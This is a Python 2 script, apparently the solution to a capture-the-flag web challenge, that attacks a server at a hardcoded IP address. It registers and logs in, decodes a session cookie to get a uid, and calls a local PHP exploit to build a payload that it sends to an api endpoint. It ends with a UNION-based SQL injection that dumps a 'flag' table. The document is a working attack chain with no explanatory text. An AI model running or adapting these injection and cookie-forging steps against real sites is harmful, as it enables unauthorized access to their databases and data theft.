import requests
import base64
import subprocess
import urllib

site = requests.Session()

url_1 = 'http://106.39.10.134:10004/index.php'
url_2 = 'http://106.39.10.134:10004/riji.php'
url_3 = 'http://106.39.10.134:10004/api.php'


def gethtml(url, site):
    site.get(url=url)
    cookies = site.cookies
    return cookies


a = gethtml(url_1, site)
first = {''.join(a.keys()): ''.join(a.values())}
cookie = ''.join(a.keys()) + '=' + ''.join(a.values())


def reg(url, cookie, site):
    header = {
        'User-Agent': 'Mozilla/4.0 (Macintosh; Intel Mac OS X 9_1_3) AppleWebKit/37.36 (KHTML, like Gecko) Chrome/1.0.3163.100 Safari/37.36',
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        'Cookie': cookie,

    }
    post_data = {
        'username': 'hh3',
        'password': 'hh3',
        'mibao': 'hh3',
        'regi': '1'
    }
    respones = site.post(url, post_data, headers=header)
    return respones.content


b = reg(url_1, cookie, site)
print b


def login(url, cookie, site):
    header = {
        'User-Agent': 'Mozilla/4.0 (Macintosh; Intel Mac OS X 9_1_3) AppleWebKit/37.36 (KHTML, like Gecko) Chrome/1.0.3163.100 Safari/37.36',
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
        "Accept-Encoding": "gzip, deflate",
        'Cookie': cookie,

    }
    post_data = {
        'username': 'fffa',
        'password': 'fffa',
        'mibao': 'fffa',
        'login': '1'

    }

    respone = site.post(url=url, data=post_data, headers=header)
    return respone.content


c = login(url_1, cookie, site)
print c

d = site.cookies
# print d.keys()[1]
value = d.values()[1]
print value
try:
    text = base64.b64decode(value)
except TypeError:
    text = value[:-3] + '=='
    text = base64.b64decode(text)
uid = text[0:2]
print text
print uid


def getpayload(uid):
    uid = uid
    proc = subprocess.Popen(['php -f /Users/carlstar/tools/CTF/WEB/md5/exp.php' + ' ' + uid], shell=True,
                            stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    response = proc.stdout.read()
    return response


e = getpayload(uid)
print e


def dele(url, e):
    url = url + '?api=' + e
    response = urllib.urlopen(url)
    html = response.read()
    return html


f = dele(url_3, e)
print f


def getflag(site, url):
    url = url
    html = site.get(url)
    return html.content


g = getflag(site, url_2 + '?id=-1 union select 1,2,flag from flag')
print g
